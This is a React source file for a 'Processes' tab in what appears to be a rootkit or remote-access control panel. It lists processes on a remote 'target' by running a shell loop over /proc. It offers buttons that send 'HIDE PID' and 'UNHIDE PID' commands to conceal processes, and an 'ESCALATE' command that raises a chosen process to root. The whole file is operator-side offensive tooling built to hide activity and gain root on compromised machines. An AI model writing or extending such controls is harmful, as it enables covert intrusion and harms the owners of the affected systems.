import { useState, useCallback, useEffect, useRef } from 'react'
import { Activity, Eye, EyeOff, Zap, Plus } from 'lucide-react'
import { Th } from '../../components/Th'
import { useSnapshot, SnapshotBar, EmptySnapshotCta } from '../Target'

const PS_CMD = "for d in /proc/[0-9]*; do u=$(stat -c %u \"$d\" 2>/dev/null); cat \"$d/stat\" 2>/dev/null | sed \"s/^/$u /\"; done"

export function ProcsTab({ target: t, cmd, query, execCmd, busy, refreshToken }) {
  const snap = useSnapshot(`procs:${t.id}`)
  const [filter, setFilter] = useState('')
  const [visibility, setVisibility] = useState('all')
  const [escPid, setEscPid] = useState('')
  const [escStatus, setEscStatus] = useState(null)
  const [hideVal, setHideVal] = useState('')
  const hiddenPids = t.hidden?.pid || []

  const capture = useCallback(() => {
    snap.setLoading(true)
    execCmd(PS_CMD, t.id).then(r => {
      if (r.ok) {
        const parsed = r.output.split('\n').filter(Boolean).map(line => {
          const m = line.match(/^(\d+)\s+(\d+)\s+\((.+?)\)\s+(\S+)\s+(\d+)/)
          if (!m) return null
          return { uid: m[1], pid: m[2], comm: m[3], stat: m[4], ppid: m[5] }
        }).filter(Boolean).sort((a, b) => Number(a.pid) - Number(b.pid))
        snap.set(parsed)
      } else {
        snap.fail(r.output || 'failed')
      }
    })
  }, [execCmd, t.id, snap])
  const captureRef = useRef(capture)
  captureRef.current = capture
  useEffect(() => {
    if (t.online && !busy) captureRef.current()
  }, [t.id, t.online, busy, refreshToken])

  const doEscalate = useCallback((pid) => {
    setEscStatus('pending')
    query(`ESCALATE ${pid}`, t.id).then(r => {
      setEscStatus(r.ok ? 'ok' : 'error')
      if (r.ok) setEscPid('')
      setTimeout(() => { setEscStatus(null); capture() }, 1500)
    })
  }, [query, t.id, capture])

  const procs = snap.data || []
  const matching = filter
    ? procs.filter(p => p.comm.includes(filter) || p.pid === filter || p.ppid === filter || p.uid === filter)
    : procs
  const filtered = matching.filter(p => visibility === 'all' ||
    (visibility === 'hidden') === hiddenPids.includes(p.pid))

  // hidden pids not in scan results
  const scannedPids = new Set(procs.map(p => p.pid))
  const extraHidden = visibility === 'visible' ? [] : hiddenPids.filter(p =>
    !scannedPids.has(p) && (!filter || p.includes(filter)))
    .sort((a, b) => Number(a) - Number(b))

  if (!snap.time && !snap.loading)
    return <EmptySnapshotCta icon={Activity} title="Processes"
      subtitle="Scan /proc for running processes on the target"
      onCapture={capture} online={t.online && !busy} loading={snap.loading} />

  return (
    <div className="flex flex-col h-full">
      <SnapshotBar title="Processes" icon={Activity} count={procs.length} hiddenCount={hiddenPids.length}
        time={snap.time} loading={snap.loading} onSnapshot={capture} online={t.online && !busy}>
        <div className="flex border-2 border-border bg-bg ml-2">
          {['all', 'visible', 'hidden'].map(value => (
            <button key={value} type="button"
              className={`px-2.5 py-1 text-xs font-bold capitalize border-r border-border last:border-r-0 ${visibility === value ? 'bg-main text-main-fg' : 'hover:bg-secondary'}`}
              onClick={() => setVisibility(value)}>{value}</button>
          ))}
        </div>
        <input className="nb-input px-3 py-1.5 text-sm w-40 ml-2" placeholder="filter..."
          value={filter} onChange={e => setFilter(e.target.value)} />
      </SnapshotBar>
      {snap.error && (
        <div className="p-6 text-center">
          <div className="text-red font-bold mb-1">Scan failed</div>
          <div className="text-sm text-fg-3">{snap.error}</div>
        </div>
      )}
      {!snap.error && !filtered.length && !extraHidden.length && !snap.loading ? (
        <div className="flex-1 flex flex-col items-center justify-center gap-2 text-fg-3 p-12">
          <Activity size={24} />
          <span className="text-sm font-bold">{procs.length ? 'No matches' : 'No processes detected'}</span>
          {!procs.length && <span className="text-xs">The scan returned no process entries.</span>}
        </div>
      ) : !snap.error && (filtered.length > 0 || extraHidden.length > 0) && (
        <div className="flex-1 overflow-auto">
          <table className="w-full text-sm">
            <thead className="sticky top-0 bg-secondary border-b-2 border-border">
              <tr><Th>PID</Th><Th>User</Th><Th>PPID</Th><Th>State</Th><Th>Command</Th><Th></Th></tr>
            </thead>
            <tbody>
              {filtered.map(p => {
                const isHidden = hiddenPids.includes(p.pid)
                const isRoot = p.uid === '0'
                return (
                  <tr key={p.pid} className={`border-b border-border hover:bg-bg-2 group ${isHidden ? 'opacity-40' : ''}`}>
                    <td className="px-4 py-2 font-mono">{p.pid}</td>
                    <td className={`px-4 py-2 font-mono ${isRoot ? 'text-red font-bold' : 'text-fg-3'}`}>{isRoot ? 'root' : p.uid}</td>
                    <td className="px-4 py-2 font-mono text-fg-3">{p.ppid}</td>
                    <td className="px-4 py-2 font-mono">{p.stat}</td>
                    <td className="px-4 py-2 font-mono">{p.comm}</td>
                    <td className="px-4 py-2 text-right flex items-center justify-end gap-1">
                      <button
                        className="p-1 text-fg-3 hover:text-amber opacity-0 group-hover:opacity-100 transition-opacity"
                        title="Escalate to root"
                        onClick={(e) => { e.stopPropagation(); doEscalate(p.pid) }}
                        disabled={!t.online || isRoot || busy}
                      >
                        <Zap size={14} />
                      </button>
                      <button
                        className={`p-1 transition-opacity ${isHidden ? 'text-green opacity-100' : 'text-fg-3 hover:text-red opacity-0 group-hover:opacity-100'}`}
                        title={isHidden ? 'Unhide PID' : 'Hide PID'}
                        onClick={() => {
                          if (isHidden) {
                            cmd(`UNHIDE PID ${p.pid}`)
                          } else {
                            cmd(`HIDE PID ${p.pid}`)
                          }
                        }}
                      >
                        {isHidden ? <Eye size={14} /> : <EyeOff size={14} />}
                      </button>
                    </td>
                  </tr>
                )
              })}
              {extraHidden.map((pid, i) => (
                <tr key={`h-${i}`} className="border-b border-border hover:bg-bg-2 group opacity-40">
                  <td className="px-4 py-2 font-mono">{pid}</td>
                  <td className="px-4 py-2 font-mono text-fg-3" colSpan={3}>not in scan</td>
                  <td className="px-4 py-2 font-mono text-fg-3">-</td>
                  <td className="px-4 py-2 text-right">
                    <button className="p-1 text-green opacity-100" title="Unhide PID"
                      onClick={() => cmd(`UNHIDE PID ${pid}`)}>
                      <Eye size={14} />
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
      <div className="flex items-center gap-2 px-4 py-2 border-t-2 border-border bg-bg-2">
        <EyeOff size={14} className="text-fg-3 shrink-0" />
        <span className="text-xs font-bold uppercase tracking-wide text-fg-3">Hide PID</span>
        <input className="nb-input px-3 py-1.5 text-sm w-28 font-mono" placeholder="1234"
          value={hideVal} onChange={e => setHideVal(e.target.value.replace(/\D/g, ''))}
          onKeyDown={e => e.key === 'Enter' && hideVal && (cmd(`HIDE PID ${hideVal}`), setHideVal(''))} />
        <button className="nb-btn px-3 py-1.5 text-sm font-bold flex items-center gap-1"
          disabled={!hideVal || !t.online || busy}
          onClick={() => { cmd(`HIDE PID ${hideVal}`); setHideVal('') }}>
          <Plus size={12} /> Add
        </button>
        <div className="border-l-2 border-border h-6 mx-1" />
        <Zap size={14} className="text-amber shrink-0" />
        <span className="text-xs font-bold uppercase tracking-wide text-fg-3">Escalate</span>
        <input className="nb-input px-3 py-1.5 text-sm w-28 font-mono" placeholder="PID"
          value={escPid} onChange={e => setEscPid(e.target.value.replace(/\D/g, ''))}
          onKeyDown={e => e.key === 'Enter' && escPid && doEscalate(escPid)} />
        <button className="nb-btn px-3 py-1.5 text-sm font-bold" disabled={!escPid || !t.online || escStatus === 'pending' || busy}
          onClick={() => doEscalate(escPid)}>
          {escStatus === 'pending' ? 'Escalating...' : 'Root'}
        </button>
        {escStatus === 'ok' && <span className="text-xs font-bold text-green">Escalated</span>}
        {escStatus === 'error' && <span className="text-xs font-bold text-red">Failed</span>}
      </div>
    </div>
  )
}
